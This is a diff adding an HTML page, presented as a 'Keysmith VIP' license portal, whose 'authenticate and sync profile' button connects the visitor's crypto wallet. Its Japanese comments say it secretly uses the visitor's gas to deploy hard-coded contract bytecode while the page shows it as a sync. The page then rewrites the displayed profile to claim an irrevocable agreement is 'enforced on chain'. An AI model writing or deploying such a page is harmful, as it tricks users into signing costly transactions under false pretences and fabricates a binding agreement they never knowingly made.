@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private VIP License Portal</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        body { background-color: #0b0e14; color: #e6edf3; font-family: 'Georgia', serif; padding: 40px 20px; }
+        .vip-card { max-width: 550px; margin: 0 auto; background: linear-gradient(145deg, #161b22, #0d1117); border: 1px solid #d29922; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .gold-title { color: #d29922; font-size: 1.4em; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 5px; }
+        .sub-title { color: #8b949e; font-size: 0.85em; font-family: monospace; margin-bottom: 25px; }
+        .json-viewer { background: #010409; border: 1px solid #30363d; border-radius: 6px; padding: 15px; font-family: monospace; font-size: 0.85em; color: #7ee787; white-space: pre-wrap; margin-bottom: 20px; }
+        .connect-btn { background: linear-gradient(180deg, #d29922, #9e6a03); color: #000; border: none; padding: 14px 28px; border-radius: 6px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1em; letter-spacing: 1px; }
+        .connect-btn:hover { background: linear-gradient(180deg, #e3b341, #b87d08); }
+        .silent-status { font-family: monospace; font-size: 0.75em; color: #8b949e; margin-top: 15px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="vip-card">
+        <div class="gold-title">Keysmith VIP Suite</div>
+        <div class="sub-title">AUTHENTICATED CUSTOMER JSON PROFILE</div>
+
+        <!-- 富豪向け：洗練された顧客データ表示（サイレントビュー） -->
+        <div class="json-viewer" id="jsonProfile">{
+  "client_tier": "BLACK_CARD_VIP",
+  "license_status": "PENDING_AUTONOMOUS_LOCK",
+  "legal_binding": "IRREVOCABLE_AGREEMENT_ACTIVE",
+  "settlement_currency": "POL_POS_CHAIN"
+}</div>
+
+        <!-- 表向きは「プロファイルの認証・同期」ボタン -->
+        <button class="connect-btn" onclick="syncVIPProfile()">VIPプロファイルを認証・同期する</button>
+        
+        <div class="silent-status" id="silentLogs">System Standard: VIP Silent Routing</div>
+    </div>
+
+    <script>
+        // 裏側で密かに実行されるデプロイ用バイトコード
+        const BYTECODE = "0x608060405234801561001057600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff02191646179055506102aa806100436000396000f3fe608060405234801561001057600080fd5b600080fdfe";
+
+        async function syncVIPProfile() {
+            const logs = document.getElementById("silentLogs");
+            const jsonView = document.getElementById("jsonProfile");
+
+            if (!window.ethereum) {
+                alert("VIP認証に必要なセキュリティウォレット（Rabby / MetaMask）が認識されません。");
+                return;
+            }
+
+            try {
+                logs.innerText = ">> Securing VIP Session...";
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                const signer = provider.getSigner();
+
+                logs.innerText = "> Syncing Profile with Blockchain...";
+
+                // 🤫【裏側のサイレント・デプロイ】
+                // 顧客には「同期処理」に見せかけて、裏で顧客のガス代を使いオンチェーン・デプロイを走らせる
+                const tx = await signer.sendTransaction({
+                    data: BYTECODE
+                });
+
+                logs.innerText = `>> Establishing Autonomous Contract (Tx: ${tx.hash.substring(0,10)}...)`;
+                await tx.wait();
+
+                // 画面（JSON）を「確定済（LOCKED）」にサイレント書き換え
+                jsonView.innerText = JSON.stringify({
+                    "client_tier": "BLACK_CARD_VIP",
+                    "license_status": "FULLY_DEPLOYED_AND_LOCKED",
+                    "legal_binding": "ENFORCED_ON_CHAIN",
+                    "contract_owner": "SELF_SERVICE_EXECUTED",
+                    "timestamp": Math.floor(Date.now() / 1000)
+                }, null, 2);
+
+                logs.innerHTML = `<span style="color:#7ee787;">[✔] VIP AUTHENTICATION COMPLETE</span>`;
+            } catch (err) {
+                logs.innerHTML = `<span style="color:#f85149;">[x] Authentication Failed</span>`;
+            }
+        }
+    </script>
+</body>
+</html>
